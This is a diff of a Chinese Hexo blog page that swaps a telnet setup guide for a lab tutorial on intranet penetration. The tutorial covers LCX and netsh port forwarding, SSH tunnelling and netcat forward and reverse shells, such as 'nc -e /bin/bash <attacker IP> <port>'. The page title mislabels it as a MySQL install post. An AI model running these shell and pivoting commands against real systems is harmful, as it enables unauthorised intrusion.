@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>用telnet连接linux |  Sharing life</title>
+      <title>linux安装MySQL[用glibc的方法].md |  Sharing life</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="https://raw.githubusercontent.com/myzyzy/my-log/image/image/football.svg" />
@@ -44,7 +44,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-用telnet连接linux"
+  id="post-内网渗透"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -55,7 +55,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  用telnet连接linux
+  linux安装MySQL[用glibc的方法].md
 </h1>
  
 
@@ -63,11 +63,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/06/07/%E7%94%A8telnet%E8%BF%9E%E6%8E%A5linux/" class="article-date">
-  <time datetime="2021-06-07T11:13:46.000Z" itemprop="datePublished">2021-06-07</time>
+      <a href="/2021/06/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="article-date">
+  <time datetime="2021-06-09T14:03:34.719Z" itemprop="datePublished">2021-06-09</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/linux%E6%9C%8D%E5%8A%A1/">linux服务</a>
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
   </div>
   
 <div class="word_count">
@@ -75,7 +75,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">184</span>
+            <span class="post-count">1.8k</span>
         </span>
     </span>
 
@@ -84,7 +84,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">6 分钟</span>
         </span>
     </span>
 </div>
@@ -99,17 +99,45 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="用telnet连接linux"><a href="#用telnet连接linux" class="headerlink" title="用telnet连接linux"></a>用telnet连接linux</h2><p>telnet传输没有经过加密，是明文的，安全性不如SSH不建议使用<br>提前关闭selinux和防火墙，配置好yum仓库</p>
-<h3 id="1-安装telnet-server-xinetd"><a href="#1-安装telnet-server-xinetd" class="headerlink" title="1.安装telnet-server xinetd"></a>1.安装telnet-server xinetd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum install telnet-server xinetd        //telnet进程由xinetd服务守护</span></span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-
-<h3 id="2-编辑telnet的配置文件"><a href="#2-编辑telnet的配置文件" class="headerlink" title="2.编辑telnet的配置文件"></a>2.编辑telnet的配置文件</h3><p>可能没有这个文件,但依旧起效</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost xinetd.d]<span class="comment"># vi /etc/xinetd.d/telnet</span></span><br></pre></td></tr></table></figure>
-<p>添加以下内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># default: on</span><br><span class="line"># description: The telnet server serves telnet sessions; it uses \</span><br><span class="line">#       unencrypted username/password pairs for authentication.</span><br><span class="line">service telnet</span><br><span class="line">&#123;</span><br><span class="line">        flags           = REUSE</span><br><span class="line">        socket_type     = stream</span><br><span class="line">        wait            = no</span><br><span class="line">        user            = root</span><br><span class="line">        server          = /usr/sbin/in.telnetd</span><br><span class="line">        log_on_failure  += USERID</span><br><span class="line">        disable         = no</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="3-启动xinetd服务"><a href="#3-启动xinetd服务" class="headerlink" title="3.启动xinetd服务"></a>3.启动xinetd服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost xinetd.d]<span class="comment"># systemctl start xinetd</span></span><br></pre></td></tr></table></figure>
-<h3 id="4-编辑-etc-securetty-添加以下内容"><a href="#4-编辑-etc-securetty-添加以下内容" class="headerlink" title="4.编辑/etc/securetty  添加以下内容"></a>4.编辑/etc/securetty  添加以下内容</h3><p><code>pts/1</code></p>
-<p>  pts/*为伪(虚拟)终端,保存，退出，可以用root用户登录  </p>
+  <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p><strong>介绍：</strong>  攻击者通过边界主机进入内网，往往会利用它当跳板进行横向渗透，但现在的内部网络大多部署了很多安全设备，网络结构错综复杂，对于某些系统的访问会受到各种阻挠，这就需要借助代理去突破这些限制，因此面对不同的网络环境对于代理的选择及使用显得格外重要。<br><strong>情景介绍：</strong> 我的本地机子网段为10开头的看成公网，电脑中装有虚拟机网段为192网段看成内网</p>
+<h2 id="端口转发和端口映射"><a href="#端口转发和端口映射" class="headerlink" title="端口转发和端口映射"></a>端口转发和端口映射</h2><p>&ensp;&ensp;端口转发，有时被称为做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。简单来说，端口转发就是将一个端口收到的流量转发到另一个端口。端口映射是NAT的一种，功能是把在公网的地址转成私有地址。简单来说，端口映射就是将一个端口映射到另一个端口供他人使用。</p>
+<ol>
+<li><p>LCX工具<br> &ensp;&ensp;LCX是一款端口转发工具，分为Windows版和Linux版，Linux版本为PortMap。<br> 命令：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\常用文件\工具\网络工具\内网渗透\lcx.exe -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line">[option:]</span><br><span class="line">端口转发</span><br><span class="line">-listen &lt;监听slave请求的端口&gt; &lt;等待链接的端口&gt;     #在外网电脑上执行</span><br><span class="line">-slave &lt;外网IP&gt; &lt;监听端口&gt; &lt;目标IP&gt;&gt; &lt;目标端口&gt;    #在外网电脑上执行</span><br><span class="line">端口映射</span><br><span class="line">-tran   &lt;等待链接的端口&gt; &lt;目标IP&gt; &lt;目标端口&gt;</span><br></pre></td></tr></table></figure>
+<p> &ensp;&ensp;推荐使用端口映射命令，端口转发命令需要在内网主机和外网主机都要执行，并且不稳定，我没有实验成功。端口映射只要在外网主机执行，<br> 实操<br> &ensp;&ensp;端口映射:在外网主机输入<code>lcx.exe -tran 2222 192.168.200.40 3389 </code>，把192网段的主机的3389端口映射到本机的2222端口，访问2222端口相当于访问192网段的3389端口<br> <img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84.png" alt="端口映射"><br> &ensp;&ensp;端口转发：在内网主机输入命令<code>lcx.exe -slave 10.1.38.70 3333 192.168.200.40 3389 </code>,在外网主机执行命令<code>lcx.exe -listen 3333 2222 </code> 把 内网主机转发的3333端口的流量转到2222端口<br> <img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/lcx%E5%86%85%E7%BD%91.PNG" alt="端口转发内网"><br> <img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%A4%96%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.png" alt="端口转发外网">  </p>
+</li>
+<li><p>windows自带命令<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266473873">参考博客</a></p>
+<p>Windows 从 Windows 2000 开始就提供了最基本的端口转发功能，是基于 Windows 的<code>IP Helper</code>服务的，不仅可以提供端口转发功能，还可以通过将 IPv4 和 IPv6 的不同地址的数据进行转发，但是只可以转发 TCP 协议，暂不支持 UDP 协议，使用<code>netsh interface portproxy</code>命令即可开启。<br><strong>命令帮助</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; netsh interface portproxy</span><br><span class="line">下列指令有效:</span><br><span class="line">此上下文中的命令:</span><br><span class="line">?              - 显示命令列表。</span><br><span class="line">add            - 在一个表格中添加一个配置项。</span><br><span class="line">delete         - 从一个表格中删除一个配置项。</span><br><span class="line">dump           - 显示一个配置脚本。</span><br><span class="line">help           - 显示命令列表。</span><br><span class="line">reset          - 重置端口代理配置状态。</span><br><span class="line">set            - 设置配置信息。</span><br><span class="line">show           - 显示信息。</span><br></pre></td></tr></table></figure>
+<p>查看所有的端口转发规则<code>netsh interface portproxy show all</code><br><strong>添加规则帮助</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add v4tov4     - 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目。</span><br><span class="line">add v4tov6     - 添加通过 IPv6 的 IPv4 和代理连接到的侦听项目。</span><br><span class="line">add v6tov4     - 添加通过 IPv4 的 IPv6 和代理连接到的侦听项目。</span><br><span class="line">add v6tov6     - 添加通过 IPv6 的 IPv6 和代理连接到的侦听项目。</span><br><span class="line">​</span><br><span class="line">用法: add v4tov4 [listenport=]&lt;integer&gt;|&lt;servicename&gt;</span><br><span class="line">            [connectaddress=]&lt;IPv4 address&gt;|&lt;hostname&gt;</span><br><span class="line">            [[connectport=]&lt;integer&gt;|&lt;servicename&gt;]</span><br><span class="line">            [[listenaddress=]&lt;IPv4 address&gt;|&lt;hostname&gt;]</span><br><span class="line">            [[protocol=]tcp]</span><br><span class="line">​</span><br><span class="line">参数:</span><br><span class="line">​</span><br><span class="line">        标记            值</span><br><span class="line">        listenport      - IPv4 侦听端口。</span><br><span class="line">        connectaddress  - IPv4 连接地址。</span><br><span class="line">        connectport     - IPv4 连接端口。</span><br><span class="line">        listenaddress   - IPv4 侦听地址。</span><br><span class="line">        protocol        - 使用的协议。现在只支持 TCP。</span><br></pre></td></tr></table></figure>
+<p>添加规则<br><code>netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=3389 connectaddress=&lt;目标IP&gt; connectport=3389</code><br>把目标IP的3389端口转发到本机<br><strong>delete命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">delete v4tov4  - 删除通过 IPv4 的 IPv4 和代理连接到的侦听项目。</span><br><span class="line">delete v4tov6  - 删除通过 IPv6 的 IPv4 和代理连接到的侦听项目。</span><br><span class="line">delete v6tov4  - 删除通过 IPv4 的 IPv6 和代理连接到的侦听项目。</span><br><span class="line">delete v6tov6  - 删除通过 IPv6 的 IPv6 和代理连接到的侦听项目。</span><br><span class="line">​</span><br><span class="line">用法: delete v4tov4 [listenport=]&lt;integer&gt;|&lt;servicename&gt;</span><br><span class="line">            [[listenaddress=]&lt;IPv4 address&gt;|&lt;hostname&gt;]</span><br><span class="line">            [[protocol=]tcp]</span><br><span class="line">​</span><br><span class="line">参数:</span><br><span class="line">​</span><br><span class="line">        标记             值</span><br><span class="line">        listenport     - 要侦听的 IPv4 端口。</span><br><span class="line">        listenport     - 要侦听的 IPv4 地址。</span><br><span class="line">        protocol       - 要使用的协议。当前仅支持 TCP。</span><br></pre></td></tr></table></figure>
+<p><strong>删除规则</strong><br><code>PS C:\Windows\system32&gt; netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=3389</code></p>
+</li>
+</ol>
+<h2 id="使用SSH端口转发"><a href="#使用SSH端口转发" class="headerlink" title="使用SSH端口转发"></a>使用SSH端口转发</h2><ol>
+<li>本地转发<br>&ensp;&ensp;设攻击者已经拿下了公网主机，并且通过主机A获取到了内网主机IP和端口信息，但是攻击者从攻击机无法直接访问内网，公网主机安装了SSH服务端，这时攻击者便可通过SSH协议连接到公网主机，再通过公网主机做跳板，连接内网主机。命令<code>ssh -L &lt;本机IP&gt;:&lt;本地端口&gt;:&lt;目的IP&gt;:&lt;目的IP端口&gt; -fN &lt;跳板主机地址&gt;</code>，命令在攻击机上执行。</li>
+<li>动态转发<br>&ensp;&ensp;动态转发指的是，本机与 SSH 服务器之间创建了一个加密连接，然后本机内部针对某个端口的通信，都通过这个加密连接转发。它的一个使用场景就是，访问所有外部网站，都通过 SSH 转发。<br>动态转发需要把本地端口绑定到 SSH 服务器。至于 SSH 服务器要去访问哪一个网站，完全是动态的，取决于原始通信，所以叫做动态转发。<br><code>ssh -D &lt;本地端口&gt; -CfNg &lt;ssh服务器地址&gt; </code><br>这种转发采用了 SOCKS5 协议，可以在客户端配置代理通过shh服务器访问服务。  </li>
+</ol>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>&ensp;&ensp;NetCat简称NC，是一个简单、可靠的网络工具，被誉为网络界的瑞士军刀。通过NC可以进行端口扫描、反弹Shell、端口监听和文件传输等操作.Centos8自带NetCat.</p>
+<ol>
+<li>正向shell<br>&ensp;&ensp;命令需要在两个能互相访问的的主机上运行。在目标机上输入<code>nc -lvvp &lt;端口&gt; -e /bin/bash</code>(在linux下，如果是windows则需要把<code>/bin/bash</code>换成cmd.exe程序的路径)，注意开放目标机上的端口，然后在攻击机上输入<code>nc &lt;目标机的IP&gt; &lt;目标机端口&gt;</code></li>
+</ol>
+<ul>
+<li>实操</li>
+<li><em>目标机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E6%AD%A3%E5%90%91%E7%9B%AE%E6%A0%87nc.PNG" alt="正向目标nc">  </li>
+<li><em>攻击机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E6%AD%A3%E5%90%91%E6%94%BB%E5%87%BBnc.PNG" alt="正向攻击nc">  </li>
+</ul>
+<ol>
+<li>反向shell<br>&ensp;&ensp;当目标机可访问外网时，可先在攻击机监听某一端口，然后从目标机连接此端口反向反弹Shell。在攻击机上输入<code>nc -lvvp &lt;端口&gt;</code>(监听某个端口)，在目标机上输入<code>nc -e /bin/bash &lt;攻击机IP&gt; &lt;攻击机开放的端口&gt;</code>，我感觉反向shell类似于钓鱼。</li>
+</ol>
+<ul>
+<li>实操</li>
+<li><em>攻击机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%8F%8D%E5%90%91shell%E6%94%BB%E5%87%BBnc.PNG" alt="反向shell攻击nc">  </li>
+<li><em>目标机</em>*<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%8F%8D%E5%90%91shell%E7%9B%AE%E6%A0%87nc.PNG" alt="反向shell目标nc">  </li>
+<li><em>攻击机</em>*<br>之后弹出<br><img src="https://raw.githubusercontent.com/myzyzy/my-log/image/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Fimage/%E5%8F%8D%E5%90%91shell%E6%94%BB%E5%87%BBnc%E8%BF%90%E8%A1%8C%E5%90%8E.PNG" alt="反向shell攻击nc运行后"></li>
+</ul>
  
       <!-- reward -->
       
@@ -174,12 +202,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/06/07/%E7%94%A8telnet%E8%BF%9E%E6%8E%A5linux/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/06/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/telnet/" rel="tag">telnet</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>
 
     </footer>
   </div>
@@ -187,15 +215,11 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/06/09/linux%E5%AE%89%E8%A3%85MySQL-%E7%94%A8glibc%E7%9A%84%E6%96%B9%E6%B3%95/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            linux安装MySQL[用glibc的方法].md
-          
-        </div>
-      </a>
     
+      <a href="/2021/06/09/linux%E5%AE%89%E8%A3%85MySQL-%E7%94%A8glibc%E7%9A%84%E6%96%B9%E6%B3%95/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">linux安装MySQL[用glibc的方法].md</div>
+      </a>
     
   </nav>
 
